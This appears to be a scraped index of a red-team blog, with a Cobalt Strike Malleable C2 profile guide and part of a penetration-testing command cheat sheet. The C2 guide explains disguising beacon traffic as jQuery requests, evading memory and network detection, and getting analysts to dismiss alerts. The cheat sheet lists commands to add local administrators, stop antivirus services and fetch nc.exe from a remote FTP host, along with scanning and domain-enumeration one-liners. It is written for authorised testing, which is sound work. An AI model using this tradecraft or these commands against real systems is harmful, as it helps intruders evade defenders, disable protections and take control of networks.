traffic from a C2 profile may bypass network sensors, but you want to tune to convince a defender that traffic is legitimate. Convincing a network analyst or security team that traffic is safe is a good technique to bypass security defenses and cause analysts to ignore alerts or mark them safe. We chose to use a jQuery request to blend in. This is a generic approach and may work against wide range of targets. Start from scratch or use a template? We recommend using an existing profile and develop your own template. The jQuery profile has been tuned and tweaked as a base profile we have used for a few years. It is often used as the starting point to build new profiles. The reference profile is self-documented, but let's walk through each section\u2026 Malleable C2 References The references and guidelines described below use the Malleable C2 profile found at https://github.com/threatexpress/malleable-c2 . Profile Name \u00b6 ![][4]Choose a profile name you would like to see in your reports. This does not affect Beacon's traffic or its footprint on target. Sleep Times \u00b6 These settings control the default time between Beacon check in (in milliseconds). A new HTTP/S beacon spawned using this C2 profile will check in using the sleep time as its callback interval, plus a random amount of time up to the specified by the jitter percentage. Choose a default time that will suit your operational needs, along with any OPSEC considerations. This example uses 60 seconds. This may be too aggressive for many engagements, and some defensive products may quickly detect beaconing behavior if it is too regular. User-Agent \u00b6 Use a User-Agent value that fits with your engagement. If possible, try to capture a real User-Agent string from the target organization, to blend in with real traffic. For example, consider sending a benign e-mail with a web bug to target organization members and monitor the User-Agents sent in subsequent GET requests. If you are using plaintext HTTP traffic, or if SSL interception is in place in the target environment, a User-Agent string that doesn't match the environment can provide an indicator for defenders. SSL Certificate \u00b6 This setting controls the SSL certificate used for HTTPS communications. If possible, utilize a real, properly-issued SSL certificate for the domain you're using. LetsEncrypt can issue free SSL certificates that are trusted by all major operating systems and browsers, and will make it harder for defenders to inspect Beacon traffic. SSL certificate store creation steps are well documented in Protect your C2 Server It is generally recommended to setup your target facing HTTPS certificates on redirector hosts. This limits the reconfiguration required on your teamserver in case a domain is burned during an operation. Caveat: Some CDN providers require your origin host to maintain a valid SSL certificate and your teamserver will need a trusted SSL certificate installed for Domain Fronting to function. Refer to the Cobalt Strike documentation https://www.cobaltstrike.com/help-malleable-c2#validssl or this post by @bluscreenofjeff https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ for instructions on configuring SSL with Cobalt Strike. SpawnTo Process \u00b6 The spawnto settings control what process a beacon will spawn for post-exploitation jobs, and when using the spawn command. This command can even use command line parameters set %windir%\\sysnative\\svchost.exe -k localservice -p -s fdPHost The additional parameters may help a Beacon blend in more if a defender looks at the command line of running processes. It can be difficult to find good candidate to use with spawnto. Experiment and test before selecting. General Guidelines: Don't use protected binaries. How do you know if they are protected? Test Don't select binaries that executes with UAC Choose a 64 bit binary for x64 payloads and 32-bit payload for x86 payloads Consider choosing a binary that would not look strange making network connections SMB Beacons \u00b6 SMB Beacons use named pipes to communicate through a parent Beacon. This allows for peer-to-peer communication between Beacons on the same host or across the network. The SMB Beacon's pipe names can be configured. Do not use default settings, as some defensive products will look for these defaults. Try to choose something that will blend in with the target environment. Follow this link: https://www.cobaltstrike.com/help-smb-beacon for more information on SMB Beacons. DNS Beacons \u00b6 DNS Beacons use DNS for all or part of their communications. Depending on the target environment's defensive technologies, DNS traffic can be easily detected, but is often a blind spot for defenders. DNS is best used as low and slow backup channel. Change the defaults to better fit your engagement. Follow this link https://www.cobaltstrike.com/help-dns-beacon for more information on DNS Beacons. Staging Process \u00b6 \u2026 truncated\u2026 The Beacon staging process can be customized. The staging process is the stub of code used to fully load a Beacon. Read this post https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/ to learn more about the Beacon staging process. Fortunately, the HTTP characteristics of the Beacon stager can be modified. Change these settings to mimic a single legitimate HTTP request/response. In this example the requests are sent to /jquery-3.3.1.slim.min.js or /jquery-3.3.2.slim.min.js , dependent on the target process architecture, to begin the staging process. The HTTP server parameters are built to mimic a jQuery request. The Beacon commands and payloads are blended in to a chunk of the jQuery javascript text. The client makes a request that is reasonable when requesting jQuery from content delivery network. Many websites do this with http://www.google-analytics.com/ga.js \"> src=\"jquery-3.3.1.min.js\"> . The URIs can be modified to look like other CDNs. For example, you could modify the http-stager to look as if it is pulling from the Microsoft jQuery CDN. https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js In some cases, it may be better to use stageless payloads, as the staging process is an indicator that defensive products can alert on. Memory Indicators \u00b6 Some of the newest Malleable C2 features enable modification of many Beacon memory indicators. This topic can get quite deep and deserves it own blog post. Refer to https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/ and https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK for details on controlling Beacon memory indicators. This example uses the peclone tool to rip the memory metadata from explorer.exe, save as part of the Beacon payload, and uses several of the recommendations from Raphael's \"In Memory Evasion\" blogpost. HTTP GET \u00b6 \u2026 truncated\u2026 Like the http-stager section, the HTTP GET requests/responses can be modified. This section is used to check a teamserver for tasks. More information can be found here https://www.cobaltstrike.com/help-http-beacon . This profile uses a similar format found in the http-stager. The difference is the use of the cookie __cfduid= . This value contains information about the Beacon and is used by the teamserver to issue tasks. The teamserver responds with a task hidden in the jQuery javascript text. Modify this section to match the HTTP traffic you would like to use. If you choose to use a GET-only profile (see below), this is also how Beacon transmits information back to the teamserver. Note The set uri option can accept multiple URIs. This can be used to add diversity to your requests. However, Beacons will not perform requests in a round robin style as you might assume and instead a single URI from the list will be assigned to each Beacon during staging. HTTP POST \u00b6 Like the http-stager and http-get sections, the HTTP-POST requests/responses can be modified. The HTTP-POST section serves as Beacon's response to commands issued by the server and can actually be performed as a HTTP GET or HTTP POST request. This example uses an HTTP POST as shown with set verb \"POST\"; The HTTP traffic follows the same style of the HTTP-GET section and mimics a jQuery request. You can change the mode from HTTP-POST to HTTP-GET by commenting out the POST section and uncommenting the GET section of HTTP-POST. GET-Only Profiles have Trade-offs GET-Only profiles have some trade-offs and may leave you scratching your head when attempting to pull large amounts of data (i.e. download a file or take a screenshot). This is due to the way data is transmitted within the URI, URI parameters, or Headers. This side-effect is well documented by Raphael at It is important to always validate and test Malleable C2 profiles before using them on a target. A malformed profile can easily cause Beacons to fail to check in, or to not send output from tasks. Always test new C2 profiles before utilizing them in a real-world situation. C2lint \u00b6 C2lint is a tool provide with Cobalt Strike to test a profile for errors. Run this and correct errors before using on an engagement. https://www.cobaltstrike.com/help-malleable-c2 Example ./c2lint c2lint jquery-c2.3.11.profile Manual Testing \u00b6 In addition to testing with c2lint, manually test all features of a Beacon on a test system. Quick Steps for Manual Testing and Validation Start wireshark Start a teamserver using the test profile Create a HTTP listener (named http) Create a SMB listener (named smb) Create a Scripted Web Delivery attack to stage the HTTP Beacon Attacks -> Web Drive-by -> Scripted Web Delivery Run the PowerShell on a test Windows system as an Administrator Interact with the elevated Beacon Spawn new Beacons, interact with each, and execute spawn commands: 1 2 3 4 spawn x64 http spawn x86 http spawn x64 smb spawn x86 smb Review the packet capture data to ensure the http traffic is what you expect: Review the staging process Review the http-get process Review th http-post process (even if you use GET) Execute other Beacon commands to ensure it is working as expected (at a minimum): 1 2 3 4 keylogger screenshot download upload References \u00b6 Cobalt Strike Malleable C2 Help Documents \u2013 https://www.cobaltstrike.com/help-malleable-c2 Example Profiles \u2013 https://github.com/rsmudge/Malleable-C2-Profiles Another profile reference (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ Random profile generator (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/ In-memory Evation (Raphael Mudge) \u2013 https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK Cobalt Strike 3.6 \u2013 A Path for Privilege Escalation (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/ Malleable Command and Control (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/","title":"A Deep Dive into Cobalt Strike Malleable C2"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#a-deep-dive-into-cobalt-strike-malleable-c2","text":"Joe Vest | September 5, 2018 | Tweet This Post: One of Cobalt Strike's most valuable features is its ability to modify the behavior of the Beacon payload. By changing various defaults within the framework, an operator can modify the memory footprint of Beacon, change how often it checks in, and even what Beacon's network traffic looks like. All of these features are controlled by the Malleable C2 profile, which is chosen when starting the team server. The article makes the assumption that you understand the basics of malleable C2 and is intended to be used as reference for designing and creating malleable C2 profiles. The profile found at (https://github.com/threatexpress/malleable-c2 is to used as a reference profile. It is highly documented and contains tips and guidance to aide in creating new C2 profiles. If you are new to malleable C2, we recommend starting with this reference by Jeff Dimmock (@bluscreenofjeff) https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ or reading the other references. Big thanks to @andrewchiles and @001SPARTaN for helping test and develop this C2 profile!!! Don't use defaults. Use a profile. Modify sample profiles before use. It's likely that public Malleable C2 profiles are signatured by security products. Remember you're still generating \"beaconing\" network traffic that creates a detectable pattern that is mostly independent of the chosen profile Test, Test, Test The following are quick tips to consider when setting parameter values. Follow this to reduce troubleshooting errors. Enclose parameters in double quote, not single 1 2 set useragent \"SOME AGENT\"; # GOOD set useragent 'SOME AGENT'; # BAD Semicolons are ok prepend \"This is an example;\"; Escape Double quotes append \"here is \"some\" stuff\"; Escape Backslashes append \"more \\ stuff\"; Some special characters do not need escaping prepend \"!@#$%^&*()\"; The example profile used in the post can be found at https://github.com/threatexpress/malleable-c2 . This C2 profile is designed to mimic a jQuery request. This javascript framework is often used by many websites and may blend into a target's network. Consider your target when deciding on what a profile to emulate. C2 traffic should blend in with normal traffic. Network traffic from a C2 profile may bypass network sensors, but you want to tune to convince a defender that traffic is legitimate. Convincing a network analyst or security team that traffic is safe is a good technique to bypass security defenses and cause analysts to ignore alerts or mark them safe. We chose to use a jQuery request to blend in. This is a generic approach and may work against wide range of targets. Start from scratch or use a template? We recommend using an existing profile and develop your own template. The jQuery profile has been tuned and tweaked as a base profile we have used for a few years. It is often used as the starting point to build new profiles. The reference profile is self-documented, but let's walk through each section\u2026 Malleable C2 References The references and guidelines described below use the Malleable C2 profile found at https://github.com/threatexpress/malleable-c2 .","title":"A Deep Dive into Cobalt Strike Malleable C2"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#profile-name","text":"![][4]Choose a profile name you would like to see in your reports. This does not affect Beacon's traffic or its footprint on target.","title":"Profile Name"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#sleep-times","text":"These settings control the default time between Beacon check in (in milliseconds). A new HTTP/S beacon spawned using this C2 profile will check in using the sleep time as its callback interval, plus a random amount of time up to the specified by the jitter percentage. Choose a default time that will suit your operational needs, along with any OPSEC considerations. This example uses 60 seconds. This may be too aggressive for many engagements, and some defensive products may quickly detect beaconing behavior if it is too regular.","title":"Sleep Times"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#user-agent","text":"Use a User-Agent value that fits with your engagement. If possible, try to capture a real User-Agent string from the target organization, to blend in with real traffic. For example, consider sending a benign e-mail with a web bug to target organization members and monitor the User-Agents sent in subsequent GET requests. If you are using plaintext HTTP traffic, or if SSL interception is in place in the target environment, a User-Agent string that doesn't match the environment can provide an indicator for defenders.","title":"User-Agent"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#ssl-certificate","text":"This setting controls the SSL certificate used for HTTPS communications. If possible, utilize a real, properly-issued SSL certificate for the domain you're using. LetsEncrypt can issue free SSL certificates that are trusted by all major operating systems and browsers, and will make it harder for defenders to inspect Beacon traffic. SSL certificate store creation steps are well documented in Protect your C2 Server It is generally recommended to setup your target facing HTTPS certificates on redirector hosts. This limits the reconfiguration required on your teamserver in case a domain is burned during an operation. Caveat: Some CDN providers require your origin host to maintain a valid SSL certificate and your teamserver will need a trusted SSL certificate installed for Domain Fronting to function. Refer to the Cobalt Strike documentation https://www.cobaltstrike.com/help-malleable-c2#validssl or this post by @bluscreenofjeff https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ for instructions on configuring SSL with Cobalt Strike.","title":"SSL Certificate"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#spawnto-process","text":"The spawnto settings control what process a beacon will spawn for post-exploitation jobs, and when using the spawn command. This command can even use command line parameters set %windir%\\sysnative\\svchost.exe -k localservice -p -s fdPHost The additional parameters may help a Beacon blend in more if a defender looks at the command line of running processes. It can be difficult to find good candidate to use with spawnto. Experiment and test before selecting. General Guidelines: Don't use protected binaries. How do you know if they are protected? Test Don't select binaries that executes with UAC Choose a 64 bit binary for x64 payloads and 32-bit payload for x86 payloads Consider choosing a binary that would not look strange making network connections","title":"SpawnTo Process"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#smb-beacons","text":"SMB Beacons use named pipes to communicate through a parent Beacon. This allows for peer-to-peer communication between Beacons on the same host or across the network. The SMB Beacon's pipe names can be configured. Do not use default settings, as some defensive products will look for these defaults. Try to choose something that will blend in with the target environment. Follow this link: https://www.cobaltstrike.com/help-smb-beacon for more information on SMB Beacons.","title":"SMB Beacons"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#dns-beacons","text":"DNS Beacons use DNS for all or part of their communications. Depending on the target environment's defensive technologies, DNS traffic can be easily detected, but is often a blind spot for defenders. DNS is best used as low and slow backup channel. Change the defaults to better fit your engagement. Follow this link https://www.cobaltstrike.com/help-dns-beacon for more information on DNS Beacons.","title":"DNS Beacons"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#staging-process","text":"\u2026 truncated\u2026 The Beacon staging process can be customized. The staging process is the stub of code used to fully load a Beacon. Read this post https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/ to learn more about the Beacon staging process. Fortunately, the HTTP characteristics of the Beacon stager can be modified. Change these settings to mimic a single legitimate HTTP request/response. In this example the requests are sent to /jquery-3.3.1.slim.min.js or /jquery-3.3.2.slim.min.js , dependent on the target process architecture, to begin the staging process. The HTTP server parameters are built to mimic a jQuery request. The Beacon commands and payloads are blended in to a chunk of the jQuery javascript text. The client makes a request that is reasonable when requesting jQuery from content delivery network. Many websites do this with http://www.google-analytics.com/ga.js \"> src=\"jquery-3.3.1.min.js\"> . The URIs can be modified to look like other CDNs. For example, you could modify the http-stager to look as if it is pulling from the Microsoft jQuery CDN. https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js In some cases, it may be better to use stageless payloads, as the staging process is an indicator that defensive products can alert on.","title":"Staging Process"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#memory-indicators","text":"Some of the newest Malleable C2 features enable modification of many Beacon memory indicators. This topic can get quite deep and deserves it own blog post. Refer to https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/ and https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK for details on controlling Beacon memory indicators. This example uses the peclone tool to rip the memory metadata from explorer.exe, save as part of the Beacon payload, and uses several of the recommendations from Raphael's \"In Memory Evasion\" blogpost.","title":"Memory Indicators"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#http-get","text":"\u2026 truncated\u2026 Like the http-stager section, the HTTP GET requests/responses can be modified. This section is used to check a teamserver for tasks. More information can be found here https://www.cobaltstrike.com/help-http-beacon . This profile uses a similar format found in the http-stager. The difference is the use of the cookie __cfduid= . This value contains information about the Beacon and is used by the teamserver to issue tasks. The teamserver responds with a task hidden in the jQuery javascript text. Modify this section to match the HTTP traffic you would like to use. If you choose to use a GET-only profile (see below), this is also how Beacon transmits information back to the teamserver. Note The set uri option can accept multiple URIs. This can be used to add diversity to your requests. However, Beacons will not perform requests in a round robin style as you might assume and instead a single URI from the list will be assigned to each Beacon during staging.","title":"HTTP GET"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#http-post","text":"Like the http-stager and http-get sections, the HTTP-POST requests/responses can be modified. The HTTP-POST section serves as Beacon's response to commands issued by the server and can actually be performed as a HTTP GET or HTTP POST request. This example uses an HTTP POST as shown with set verb \"POST\"; The HTTP traffic follows the same style of the HTTP-GET section and mimics a jQuery request. You can change the mode from HTTP-POST to HTTP-GET by commenting out the POST section and uncommenting the GET section of HTTP-POST. GET-Only Profiles have Trade-offs GET-Only profiles have some trade-offs and may leave you scratching your head when attempting to pull large amounts of data (i.e. download a file or take a screenshot). This is due to the way data is transmitted within the URI, URI parameters, or Headers. This side-effect is well documented by Raphael at It is important to always validate and test Malleable C2 profiles before using them on a target. A malformed profile can easily cause Beacons to fail to check in, or to not send output from tasks. Always test new C2 profiles before utilizing them in a real-world situation.","title":"HTTP POST"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#c2lint","text":"C2lint is a tool provide with Cobalt Strike to test a profile for errors. Run this and correct errors before using on an engagement. https://www.cobaltstrike.com/help-malleable-c2 Example ./c2lint c2lint jquery-c2.3.11.profile","title":"C2lint"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#manual-testing","text":"In addition to testing with c2lint, manually test all features of a Beacon on a test system. Quick Steps for Manual Testing and Validation Start wireshark Start a teamserver using the test profile Create a HTTP listener (named http) Create a SMB listener (named smb) Create a Scripted Web Delivery attack to stage the HTTP Beacon Attacks -> Web Drive-by -> Scripted Web Delivery Run the PowerShell on a test Windows system as an Administrator Interact with the elevated Beacon Spawn new Beacons, interact with each, and execute spawn commands: 1 2 3 4 spawn x64 http spawn x86 http spawn x64 smb spawn x86 smb Review the packet capture data to ensure the http traffic is what you expect: Review the staging process Review the http-get process Review th http-post process (even if you use GET) Execute other Beacon commands to ensure it is working as expected (at a minimum): 1 2 3 4 keylogger screenshot download upload","title":"Manual Testing"},{"location":"blogs/2018/11/a-deep-dive-into-cobalt-strike-malleable-c2/#references","text":"Cobalt Strike Malleable C2 Help Documents \u2013 https://www.cobaltstrike.com/help-malleable-c2 Example Profiles \u2013 https://github.com/rsmudge/Malleable-C2-Profiles Another profile reference (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobalt-strike/ Random profile generator (@bluscreenofjeff) \u2013 https://bluescreenofjeff.com/2017-08-30-randomized-malleable-c2-profiles-made-easy/ In-memory Evation (Raphael Mudge) \u2013 https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK Cobalt Strike 3.6 \u2013 A Path for Privilege Escalation (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/ Malleable Command and Control (Raphael Mudge) \u2013 https://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/","title":"References"},{"location":"blogs/2019/01/penetration-testing-pasties/","text":"Penetration Testing Pasties \u00b6 James Tubberville | January 11, 2019 | Tweet This Post: 'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest ( @joevest ), Andrew Chiles ( @andrewchiles ), Derek Rushing, or myself ( @minis_io ) have found useful. Over time additional sections, section placeholders, snippets, and links were added for \"quick reference\" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki. As usual, you can find the raw file and get the latest version of tools on our GitHub repository: . Penetration Testing Framework http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html Penetration Testing Execution Standard http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines Good writeup on passive information gathering http://www.securitysift.com/passive-reconnaissance/ Password Breach Database, requires subscription https://leakbase.pw/ FOCA \u00b6 Maltego \u00b6 ReconNG \u00b6 Metagoofil \u00b6 Source: http://resources.infosecinstitute.com/kali-reporting-tools/#gref Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc. Metagoofil performs the following: Searches the given file type using the Google search engine Downloads all the documents found Extracts metadata from downloaded documents Saves the result in HTML file Perform document metadata searching on target domain using first 200 google results 1 metagoofil -d .com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html censys.io \u00b6 Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed. Create an account and get an API key for use in ReconNG or manual searching https://censys.io/ipv4?q= Python API 1 2 3 4 5 6 7 8 9 10 # pip install censys import censys.ipv4 c = censys . ipv4 . CensysIPv4 ( api_id = \"Get from MyAccount at censys.io\" , api_secret = \"Get from MyAccount at censys.io\" ) ranges = [ \"X.X.X.0/24\" , \"X.X.X.0/24\" , \"X.X.X.0/24\" ] for range in ranges : results = c . search ( range ) for result in results : for port in result [ \"protocols\" ]: print result [ \"ip\" ] + \",\" + port dsnrecon \u00b6 Normal dns reverse lookup of IP range with CSV output 1 dnsrecon -t rvl -r 1.2.3.4/24 -c output.csv Perform default enumeration of a domain 1 dnsrecon -d Perform zone transfer attempt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 dnsrecon -t axfr -d \u2570 $ dnsrecon -h Version: 0.8.10 Usage: dnsrecon.py Options: -h, --help Show this help message and exit. -d, --domain Target domain. -r, --range IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask). -n, --name_server Domain server to use. If none is given, the SOA of the target will be used. -D, --dictionary Dictionary file of subdomain and hostnames to use for brute force. -f Filter out of brute force domain lookup, records that resolve to the wildcard defined IP address when saving records. -t, --type Type of enumeration to perform: std SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail. rvl Reverse lookup of a given CIDR or IP range. brt Brute force domains and hosts using a given dictionary. srv SRV records. axfr Test all NS servers for a zone transfer. goo Perform Google search for subdomains and hosts. snoop Perform cache snooping against all NS servers for a given domain, testing all with file containing the domains, file given with -D option. tld Remove the TLD of given domain and test against all TLDs registered in IANA. zonewalk Perform a DNSSEC zone walk using NSEC records. -a Perform AXFR with standard enumeration. -s Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration. -g Perform Google enumeration with standard enumeration. -w Perform deep whois record analysis and reverse lookup of IP ranges found through Whois when doing a standard enumeration. -z Performs a DNSSEC zone walk with standard enumeration. --threads Number of threads to use in reverse lookups, forward lookups, brute force and SRV record enumeration. --lifetime Time to wait for a server to response to a query. --db SQLite 3 file to save found records. --xml XML file to save found records. --iw Continue brute forcing a domain even if a wildcard records are discovered. -c, --csv Comma separated value file. -j, --json JSON file. -v Show attempts in the brute force modes. TheHarvester \u00b6 Perform lookup against with additional DNS reverse on all ranges discovered 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 theharvester -d -c -n -b google -l 1000 [-f output] Usage: theharvester options -d: Domain to search or company name -b: data source: google, googleCSE, bing, bingapi, pgp linkedin, google-profiles, people123, jigsaw, twitter, googleplus, all -s: Start in result number X (default: 0) -v: Verify host name via dns resolution and search for virtual hosts -f: Save the results into an HTML and XML file -n: Perform a DNS reverse query on all ranges discovered -c: Perform a DNS brute force for the domain name -t: Perform a DNS TLD expansion discovery -e: Use this DNS server -l: Limit the number of results to work with(bing goes from 50 to 50 results, -h: use SHODAN database to query discovered hosts google 100 to 100, and pgp doesn't use this option) Examples: theharvester -d microsoft.com -l 500 -b google theharvester -d microsoft.com -b pgp theharvester -d microsoft -l 200 -b linkedin theharvester -d apple.com -b googleCSE -l 500 -s 300 Nmap \u00b6 https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt Host discovery 1 2 3 4 nmap -sn -n nmap -A (run this second) nmap -sV -F nmap -p- -sV -O -T4 -v7 -sC Open SMB shares 1 nmap --script=smb-enum-shares -p445 Open NFS Shares 1 nmap -p 111,2049 --script nfs-ls,nfs-showmount UDP scan: 1 nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5 Anonymous FTP 1 2 nmap -sC -sV -p21 nmap -sV -n -sS -Pn-vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 VNC Brute 1 nmap --script=vnc-brute -p5800,5900 Rawr Scan 1 nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web MSSQL Scan 1 nmap -vv-sV -Pn-n -p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa -oA HTTP Scan 1 nmap -vv -sS -Pn-n -p80,443,8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt -oA IDS Evasion \u00b6 Append extra random data to change default packet lengths 1 \u2013data-length 15 Randomize scan order 1 -randomize-hosts Web \u00b6 Eyewitness \u00b6 Get the most recent version 1 git clone https://github.com/ChrisTruncer/EyeWitness.git Faster Scan 1 ./EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Slow version via proxychains 1 2 3 proxychains ./EyeWitness.py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https proxychains ./EyeWitness.py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Proxychains specify a remote DNS server http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html On Kali linux its found here: /usr/lib/proxychains3/proxyresolv 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #!/bin/sh # This script is called by proxychains to resolve DNS names # DNS server used to resolve names DNS_SERVER = 4 .2.2.2 if [ $# = 0 ] ; then echo \" usage:\" echo \" proxyresolv \" exit fi export LD_PRELOAD = libproxychains.so.3 dig $1 @ $DNS_SERVER +tcp | awk '/A.+[0-9]+.[0-9]+.[0-9]/{print $5;}' Use Canary tokens to identify web front-end vulnerabilities In combination with Burp collaborator, identify configuration issues with web front-end appliances For example, issue request to target domain with a custom Host header pointing to your collaborator/canary: Request: 1 2 3 GET / HTTP / 1.1 Host : uniqid.burpcollaborator.net Connection : close Response (on Collaborator): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 GET / HTTP / 1.1 Host : XX.X.XXX.XX:8082 HTTP/1.1 200 Connection Established Date: Tue, 07 Feb 2017 16:32:50 GMT Transfer-Encoding: chunked Connection: close Ok / HTTP/1.1 is unavailable Ok Unknown Command Ok Unknown Command Ok Unknown Command Ok Canarytokens.org Blog \u2013 Targeting HTTP's Hidden Attack Surface Built-in Commands \u00b6 View your current user: 1 whoami View information about the current user: 1 2 net user myuser(for a local user) net user myuser /domain (for a domain user) View the local groups: 1 net localgroup View the local administrators: 1 net localgroup Administrators Add a new user: 1 net user myuser mypass /add Add a user in the local Administrators group: 1 net localgroup Administrators myuser /add View the domain name of current machine: 1 2 net config workstation net config server View the name of the domain controller: 1 reg query \"HKEY_LOCAL_MACHINE SOFTWAREMicrosoftWindows CurrentVersionGroup Policy History\" /v DCName or 1 Import-Module ActiveDirectory; (Get-ADDomainController -DomainName corp.test.com -Discover -NextClosestSite).HostName or 1 set l Get list of DCs 1 nltest /dclist:domainname or 1 netdom query /D:domin DC or 1 dsquery server or 1 nslookup -type=srv _ldap._tcp.dc._msdcs.corp.test.com Get DC Info 1 nltest /dsgetdc:domain Get DC site mapping 1 nltest /dsaddresstosite:dcname.corp.test.com Get PDC 1 netdom query /D:domain PDC or 1 nslookup -type=srv _ldap._tcp.pdc._msdcs.corp.test.com or get roles Get Roles 1 netdom query /D:domain FSMO View the list of domain users: 1 2 3 4 C:> wmic useraccount where (domain='%USERDOMAIN%') get Name > userlist.txt PS C:> ([adsisearcher]\"objectCategory=User\").Findall() | ForEach { $_.properties.samaccountname } | Sort | Out-File -Encoding ASCII users.txt or 1 net user /domain Get domain info (including DC) 1 gpresult /z View the list of domain admins: 1 net group \"Domain Admins\" /domain View domain groups 1 2 net group /domain powershell (new-object system.directoryservices.directorysearcher(\"(&amp;(objectcategory=user)(samaccountname=$($env:username)))\")).FindOne().GetDirectoryEntry().memberof View the list of started services (search for antivirus): 1 2 net start sc query Stop a service: 1 net stop \"Symantec Endpoint Protection\" View the list of started processes and the owner: 1 tasklist /v Kill a process by its name: 1 taskkill /F /IM \"cmd.exe\" Abort a shutdown/restart countdown: 1 shutdown /a Download an executable from a remote FTP server: 1 2 3 4 5 6 echo open 10.1.2.3> C:script.txt echo user myftpuser>> C:script.txt echo pass myftppass>> C:script.txt echo get nc.exe>> C:script.txt echo bye>> C:script.txt ftp -s:script.txt Upload a file to a remote FTP server: 1 2 